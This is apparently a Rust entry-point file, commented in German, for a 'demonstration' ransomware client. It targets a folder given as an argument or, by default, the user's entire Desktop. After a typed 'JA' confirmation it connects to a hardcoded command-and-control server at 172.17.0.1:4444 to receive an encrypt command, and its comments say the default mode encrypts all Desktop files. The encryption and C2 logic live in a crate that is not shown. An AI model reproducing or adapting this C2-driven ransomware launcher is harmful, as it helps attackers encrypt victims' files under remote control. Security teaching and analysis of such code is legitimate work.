use rust_mw::connect_and_wait_for_c2;
use std::env;
use std::io::{self, Write};
use std::path::PathBuf;

// Anleitung
// Software für Demonstrationszwecke (Malware)
//
// Vor dem Start:
// Es gibt zwei mögliche Modi:
//
// 1. Sicherer Modus für Tests
//  Kann verwendet werden, um die Software in einem isolierten Ordner zu testen.
//  Dabei wird der Pfad als Argument übergeben.
//  ! Achtung: Trennzeichen -- beachten, damit Cargo das Argument für das Programm verwendet
//
//  Befehl im Termminal:
//  cargo run -- <PFAD_ZUM_ORDNER>
//
//  Beispiel:
//    > cargo run -- "C:\Users\Name\Desktop\TestLabor"   (Windows)
//    > cargo run -- ./test_ordner                       (Linux / macOS)
//
//  2. Desktop Modus (eigentlich angedachter Modus, der alle auf dem Desktop gespeicherten Dateien
//     verschlüsselt)
//     Wird KEIN Pfad angegeben, wird automatisch der Desktop verwendet (Desktop des aktuellen
//     Nutzers)
//
//     Befehl (Terminal)
//     cargo run
//
//
//     !! Dieser Modus verschlüsselt alle auf dem Desktop gespeicherten Dateien
//
//     SICHERHEITS-MECHANISMUS: Egal welcher Modus gewählt wird, das Programm startet nicht sofort,
//     sondern zeigt das erkannte Zielverzeichnis an und verlangt eine manuelle Bestätigtung mit
//     "JA".

fn main() {
    // args().nth(1) = Erstes Argument auslesen
    let args: Vec<String> = env::args().collect();

    let target_path = if args.len() > 1 {
        let path = PathBuf::from(&args[1]);
        if !path.exists() {
            eprintln!("Fehler: Angegebener Pfad existiert nicht: {:?}", path);
            return;
        }
        path
    } else {
        match dirs::desktop_dir() {
            Some(path) => path,
            None => {
                eprintln!("Fehler: Desktop nicht gefunden");
                return;
            }
        }
    };

    // ---------------------------------------------------------
    // SICHERHEITS-ABFRAGE
    // ---------------------------------------------------------
    println!("!!! ACHTUNG: MALWARE DEMO MODE (C2 VERSION) !!!");
    println!("------------------------------------------------");
    println!("Das Programm zielt auf folgendes Verzeichnis für Befehl 'encrypt':");
    println!("{:?}", target_path);
    println!("------------------------------------------------");
    println!("Das Programm verbindet sich nun mit dem C2 Server.");
    println!("IP: 172.17.0.1 Port: 4444 (Hardcoded example)");

    print!("\nSoll der Client gestartet werden? 'JA' zum Starten: ");
    io::stdout().flush().unwrap();

    let mut input = String::new();
    io::stdin()
        .read_line(&mut input)
        .expect("Fehler beim Lesen");

    if input.trim() != "JA" {
        println!("Abbruch.");
        return;
    }

    // Pfad als String extrahieren
    let target_dir_str = target_path.to_string_lossy().to_string();

    // C2 Loop starten (Blockiert das Programm hier)
    // Hier IP und Port anpassen, falls nötig
    connect_and_wait_for_c2(target_dir_str, "172.17.0.1", 4444);
}
